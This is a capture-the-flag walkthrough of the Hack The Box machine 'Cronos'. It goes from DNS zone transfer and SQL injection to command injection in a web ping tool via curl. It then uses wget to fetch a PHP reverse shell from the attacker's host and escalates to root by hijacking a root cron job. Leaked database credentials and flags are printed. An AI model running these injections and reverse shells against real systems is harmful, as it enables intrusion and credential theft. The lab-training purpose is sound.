# Cronos

URL: https://app.hackthebox.com/machines/Cronos

Level: Medium

Start time: 22 Jan 2022, 4:24pm GMT+1

End time: 22 Jan 2022, 6:36pm GMT+1

Actual play time: 1 hours 25 minutes


## Walkthrough

### Enumeration

#### NMAP

Basic nmap scan:

```
# Nmap 7.92 scan initiated Sat Jan 22 16:23:06 2022 as: nmap -T4 -p- -oN 01_nmap 10.10.10.13
Nmap scan report for 10.10.10.13
Host is up (0.055s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

# Nmap done at Sat Jan 22 16:24:45 2022 -- 1 IP address (1 host up) scanned in 99.27 seconds
```

Again with -sC and -sV:

```
# Nmap 7.92 scan initiated Sat Jan 22 16:25:35 2022 as: nmap -T4 -p22,53,80 -sC -sV -oN 02_nmap 10.10.10.13
Nmap scan report for 10.10.10.13
Host is up (0.063s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 22 16:25:52 2022 -- 1 IP address (1 host up) scanned in 16.89 seconds
```

Let's check more about DNS (since we have 53/TCP open, we also run UDP scan):

```
# Nmap 7.92 scan initiated Sat Jan 22 16:35:46 2022 as: nmap -T4 -p53 -sU -sT -sV --script=dns-check-zone.nse,dns-srv-enum.nse,dns-zone-transfer.nse -oN 03_nmap_DNS_enum 10.10.10.13
Nmap scan report for 10.10.10.13
Host is up (0.052s latency).

PORT   STATE SERVICE VERSION
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
53/udp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 22 16:35:53 2022 -- 1 IP address (1 host up) scanned in 7.02 seconds
```

Web server shows a default Apache page, let's assume that there is "virtual host routing" involved.

We put cronos.htb in our /etc/hosts file:

```
root@kaligra:/usr/share/nmap/scripts# grep crono /etc/hosts
10.10.10.13     cronos.htb
```

We check again web server, we obtain another page:

![Screenshot_2022-01-22_16-41-12](https://user-images.githubusercontent.com/42389836/150674604-5aa175bf-3fa6-474a-bdbf-fb38760fd94f.png)

Nothing interesting in HTML source code:

```
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Cronos</title>

        <!-- Fonts -->
        <link href="https://fonts.googleapis.com/css?family=Raleway:100,600" rel="stylesheet" type="text/css">

        <!-- Styles -->
        <style>
            html, body {
                background-color: #fff;
                color: #636b6f;
                font-family: 'Raleway', sans-serif;
                font-weight: 100;
                height: 100vh;
                margin: 0;
            }

            .full-height {
                height: 100vh;
            }

            .flex-center {
                align-items: center;
                display: flex;
                justify-content: center;
            }

            .position-ref {
                position: relative;
            }

            .top-right {
                position: absolute;
                right: 10px;
                top: 18px;
            }

            .content {
                text-align: center;
            }

            .title {
                font-size: 84px;
            }

            .links > a {
                color: #636b6f;
                padding: 0 25px;
                font-size: 12px;
                font-weight: 600;
                letter-spacing: .1rem;
                text-decoration: none;
                text-transform: uppercase;
            }

            .m-b-md {
                margin-bottom: 30px;
            }
        </style>
    </head>
    <body>
        <div class="flex-center position-ref full-height">

            <div class="content">
                <div class="title m-b-md">
                    Cronos
                </div>

                <div class="links">
                    <a href="https://laravel.com/docs">Documentation</a>
                    <a href="https://laracasts.com">Laracasts</a>
                    <a href="https://laravel-news.com">News</a>
                    <a href="https://forge.laravel.com">Forge</a>
                    <a href="https://github.com/laravel/laravel">GitHub</a>
                </div>
            </div>
        </div>
    </body>
</html>
```

So, we assume that there is another virtual host with other stuff. Let's focus again on DNS.

We try *zone transfer* (AXFR) and we get more DNS records:

```
root@kaligra:/opt/htb/Cronos# dig axfr @10.10.10.13 cronos.htb

; <<>> DiG 9.17.19-1-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 136 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Sat Jan 22 16:40:06 CET 2022
;; XFR size: 7 records (messages 1, bytes 203)
```

So, we need to also add `admin.cronos.htb` on our `/etc/hosts` file.

Let's check web page:

![Screenshot_2022-01-22_16-41-49](https://user-images.githubusercontent.com/42389836/150674731-6d2311c5-0519-4123-b931-38ab41218c70.png)

We get a basic login page.

We try a very basic SQLi string:

![Screenshot_2022-01-22_17-53-20](https://user-images.githubusercontent.com/42389836/150674756-b5a9b790-8e7e-4e2a-ba77-67ffe22a49e3.png)


And we get access.

![Screenshot_2022-01-22_16-43-18](https://user-images.githubusercontent.com/42389836/150674781-498194a8-4539-497b-82ae-ccc506a00d56.png)


By looking at source code, we have chance to run `traceroute` or `ping` to some host.

We try code execution: 

![Screenshot_2022-01-22_16-45-08](https://user-images.githubusercontent.com/42389836/150674875-7bd9bf0c-c09a-44f9-875d-2e2a6aaf404f.png)

and we get success:

![Screenshot_2022-01-22_16-45-09](https://user-images.githubusercontent.com/42389836/150674901-5637d5e8-b37f-47ec-b23e-2a27f0089e15.png)

We look at PCAP traffic, so we can take a look on POST request, and grab cookie string:

![capture](https://user-images.githubusercontent.com/42389836/150674998-fcb3ffd1-fd09-4cd9-b99b-3fbf60ed36fc.JPG)

### User flag

From there, we play a bit with cURL:

```
curl -X POST http://admin.cronos.htb/welcome.php -d "command=traceroute&host=127.0.0.1+%26+ls+/home"
```

and we discover user `noulis`.

We can enumerate noulis home directory content:

```
curl -X POST http://admin.cronos.htb/welcome.php -d "command=traceroute&host=127.0.0.1+%26+ls+-la+/home/noulis/"


<html">

   <head>
      <title>Net Tool v0.1 </title>
   </head>

   <body>
        <h1>Net Tool v0.1</h1>
        <form method="POST" action="">
        <select name="command">
                <option value="traceroute">traceroute</option>
                <option value="ping -c 1">ping</option>
        </select>
        <input type="text" name="host" value="8.8.8.8"/>
        <input type="submit" value="Execute!"/>
        </form>
                        total 44<br>
                drwxr-xr-x 4 noulis noulis 4096 Apr  9  2017 .<br>
                drwxr-xr-x 3 root   root   4096 Mar 22  2017 ..<br>
                -rw------- 1 root   root      1 Dec 24  2017 .bash_history<br>
                -rw-r--r-- 1 noulis noulis  220 Mar 22  2017 .bash_logout<br>
                -rw-r--r-- 1 noulis noulis 3771 Mar 22  2017 .bashrc<br>
                drwx------ 2 noulis noulis 4096 Mar 22  2017 .cache<br>
                drwxr-xr-x 3 root   root   4096 Apr  9  2017 .composer<br>
                -rw------- 1 root   root    259 Apr  9  2017 .mysql_history<br>
                -rw-r--r-- 1 noulis noulis  655 Mar 22  2017 .profile<br>
                -rw-r--r-- 1 root   root     66 Apr  9  2017 .selected_editor<br>
                -rw-r--r-- 1 noulis noulis    0 Mar 22  2017 .sudo_as_admin_successful<br>
                -r--r--r-- 1 noulis noulis   33 Mar 22  2017 user.txt<br>
                      <p><a href = "logout.php">Sign Out</a></p>
   </body>

</html>
```

and we can grab flag:

```
curl -X POST http://admin.cronos.htb/welcome.php -d "command=traceroute&host=127.0.0.1+%26+cat+/home/noulis/user.txt"

   <body>
        <h1>Net Tool v0.1</h1>
        <form method="POST" action="">
        <select name="command">
                <option value="traceroute">traceroute</option>
                <option value="ping -c 1">ping</option>
        </select>
        <input type="text" name="host" value="8.8.8.8"/>
        <input type="submit" value="Execute!"/>
        </form>
                        51d236438b333970dbba7dc3089be33b<br>
                      <p><a href = "logout.php">Sign Out</a></p>
   </body>

</html>
```

We also grab `config.php` content, and we get credentials to MySQL database:

```
..
define('DB_SERVER', 'localhost');<br>
                   define('DB_USERNAME', 'admin');<br>
                   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');<br>
                   define('DB_DATABASE', 'admin');<br>
                   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);<br>
```

We try SSH access with user noulis and that password, but it doesn't work.

Then we try to enumerate databases, and we found "admin" DB:

```
curl -X POST http://admin.cronos.htb/welcome.php -d "command=traceroute&host=127.0.0.1+%26+mysql+-uadmin+-pkEjdbRigfBHUREiNSDs+-e+%22show+databases%22"

..
..
                      Database<br>
                information_schema<br>
                admin<br>
```

With same technique we discover `users` table, and we obtain another credential:

```
curl -X POST http://admin.cronos.htb/welcome.php -d "command=traceroute&host=127.0.0.1+%26+mysql+-uadmin+-pkEjdbRigfBHUREiNSDs+admin+-e+%22select+%2A+from+users%3B%22"

..
..

  id      username        password<br>
                1       admin   4f5fffa7b2340178a716e3832451e058<br>
```

We check online and we found original password (1327663704):

https://md5.gromweb.com/?md5=4f5fffa7b2340178a716e3832451e058

This password is still no valid for SSH access with user "noulis", but obviously is working to access login form.

This time we try if we can use `wget` to download stuff from our attacking machine.

Let's create a simple text file "sugo" and spawn a Python web server:

```
root@kaligra:/opt/htb/Cronos# cat > sugo
test
```

```
root@kaligra:/opt/htb/Cronos# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

We put that string in "traceroute" form:

```
127.0.0.1 & wget http://10.10.16.2:8888/sugo
```

and it works:

```
root@kaligra:/opt/htb/Cronos# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.10.13 - - [22/Jan/2022 18:08:36] "GET /sugo HTTP/1.1" 200 -
```

We can confirm that we can put stuff on web server:

![Screenshot_2022-01-22_18-09-12](https://user-images.githubusercontent.com/42389836/150675407-e3f7ec6c-6441-48d0-8e65-6b053eadb222.png)


From there, we try to upload a PHP reverse shell.

We use the one from "pentestmonkey":

https://github.com/pentestmonkey/php-reverse-shell

We just need to configure our IP and port:

```
..
..
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.2';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
..
```

We use similar `wget` command and we are able to download our PHP shell from victim machine:

```
root@kaligra:/opt/htb/Cronos# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.10.13 - - [22/Jan/2022 18:12:21] "GET /sugo HTTP/1.1" 200 -
10.10.10.13 - - [22/Jan/2022 18:12:44] "GET /php-reverse-shell.php HTTP/1.1" 200 -
```

We spawn a netcat listener:

```
# nc -nvlp 4444
listening on [any] 4444 ...

```

and we got shell:

```
listening on [any] 4444 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.13] 42690
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 19:13:27 up  1:51,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

We "upgrade" our shell:

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@cronos:/$

www-data@cronos:/$
```

Then we get some general info on machine:

```
www-data@cronos:/$ uname -ar
uname -ar
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
www-data@cronos:/$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.2 LTS
Release:        16.04
Codename:       xenial
www-data@cronos:/$ gcc
gcc
The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
```

### Privilege escalation

Since VM is called "Cronos", we focus on `crontab`, and we found a cronjobs which runs every minute with root privilege:

```
www-data@cronos:/$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

So, we simply need to replace "artisan" file with another PHP reverse shell.

We upload similar php-reverse-shell, but with a different port (5555):


```
$ip = '10.10.16.2';  // CHANGE THIS
$port = 5555;       // CHANGE THIS
```

We overwrite artisan file and we spawn another netcat listener:

```
nc -nvlp 5555
listening on [any] 5555 ...

```

We just wait a bit and...

```
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.13] 36530
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 19:31:01 up  2:08,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# pwd
/
# cd root
# cat root.txt
1703b8a3c9a8dde879942c79d02fd3a0
#
```



